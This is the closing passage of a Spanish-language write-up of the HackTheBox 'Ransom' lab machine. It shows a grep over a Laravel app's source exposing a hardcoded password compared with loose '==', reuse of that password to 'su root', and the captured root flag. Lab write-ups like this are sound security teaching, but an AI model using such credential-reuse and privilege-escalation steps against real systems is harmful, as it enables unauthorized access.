./resources/lang/en/<span class=code-red>password</span>s.php:7:    | <span class=code-red>Password</span> Reset Language Lines
./resources/lang/en/<span class=code-red>password</span>s.php:11:    | that are given by the <span class=code-red>password</span> broker for a <span class=code-red>password</span> update attempt
./resources/lang/en/<span class=code-red>password</span>s.php:12:    | has failed, such as for an invalid token or invalid new <span class=code-red>password</span>.
./resources/lang/en/<span class=code-red>password</span>s.php:16:    'reset' =&gt; 'Your <span class=code-red>password</span> has been reset!',
./resources/lang/en/<span class=code-red>password</span>s.php:17:    'sent' =&gt; 'We have emailed your <span class=code-red>password</span> reset link!',
./resources/lang/en/<span class=code-red>password</span>s.php:19:    'token' =&gt; 'This <span class=code-red>password</span> reset token is invalid.',
./resources/lang/en/auth.php:17:    '<span class=code-red>password</span>' =&gt; 'The provided <span class=code-red>password</span> is incorrect.',
./storage/framework/views/716af88e12f9db05fa041bff2e06875d7f0b09db.php:13:              <span class=code-red>password</span>: $("#<span class=code-red>password</span>").val()
./storage/framework/views/716af88e12f9db05fa041bff2e06875d7f0b09db.php:42:              &lt;p&gt;Please enter the <span class=code-red>password</span> provided to you in order to send files to the E Corp Engineers.&lt;/p&gt;  
./storage/framework/views/716af88e12f9db05fa041bff2e06875d7f0b09db.php:48:                  &lt;input type="<span class=code-red>password</span>" name="<span class=code-red>password</span>" id="<span class=code-red>password</span>" class="form-control form-control-lg" /&gt;
./app/Exceptions/Handler.php:25:        'current_<span class=code-red>password</span>',
./app/Exceptions/Handler.php:26:        '<span class=code-red>password</span>',
./app/Exceptions/Handler.php:27:        '<span class=code-red>password</span>_confirmation',
./app/Models/User.php:23:        '<span class=code-red>password</span>',
./app/Models/User.php:32:        '<span class=code-red>password</span>',
./app/Models/User.php:46:     * Always encrypt the <span class=code-red>password</span> when it is updated.
./app/Models/User.php:53:        $this-&gt;attributes['<span class=code-red>password</span>'] = bcrypt($value);
./app/Http/Kernel.php:66:        '<span class=code-red>password</span>.confirm' =&gt; \Illuminate\Auth\Middleware\Require<span class=code-red>Password</span>::class,
./app/Http/Middleware/TrimStrings.php:15:        'current_<span class=code-red>password</span>',
./app/Http/Middleware/TrimStrings.php:16:        '<span class=code-red>password</span>',
./app/Http/Middleware/TrimStrings.php:17:        '<span class=code-red>password</span>_confirmation',
./app/Http/Controllers/AuthController.php:34:            '<span class=code-red>password</span>' =&gt; 'required',
./app/Http/Controllers/AuthController.php:37:        if ($request-&gt;get('<span class=code-red>password</span>') == "UHC-March-Global-PW!") {
./database/migrations/2014_10_12_100000_create_<span class=code-red>password</span>_resets_table.php:7:class Create<span class=code-red>Password</span>ResetsTable extends Migration
./database/migrations/2014_10_12_100000_create_<span class=code-red>password</span>_resets_table.php:16:        Schema::create('<span class=code-red>password</span>_resets', function (Blueprint $table) {
./database/migrations/2014_10_12_100000_create_<span class=code-red>password</span>_resets_table.php:30:        Schema::dropIfExists('<span class=code-red>password</span>_resets');
./database/migrations/2014_10_12_000000_create_users_table.php:21:            $table-&gt;string('<span class=code-red>password</span>');
./database/factories/UserFactory.php:21:            '<span class=code-red>password</span>' =&gt; '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', // <span class=code-red>password</span>
</code></pre></div><p>Vemos que en <code>app/Http/Controllers/AuthController.php</code> se mira si la contraseña es igual a <code>UHC-March-Global-PW!</code> (usando <code>==</code> porque es vulnerable a <em>Type Juggling</em>). Esta password está configurada para el usuario <code>root</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>htb@ransom</span>:<span class=code-blue>/srv/prod</span>$ su root
Password:
root@ransom:/srv/prod# cat /root/root.txt  
a4d5e9000007b5eabfb8358b2dd9ac1a
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#explotación-de-type-juggling>Explotación de Type Juggling</a></li><li><a href=#ataque-de-texto-claro-conocido-a-un-archivo-zip-cifrado>Ataque de texto claro conocido a un archivo ZIP cifrado</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>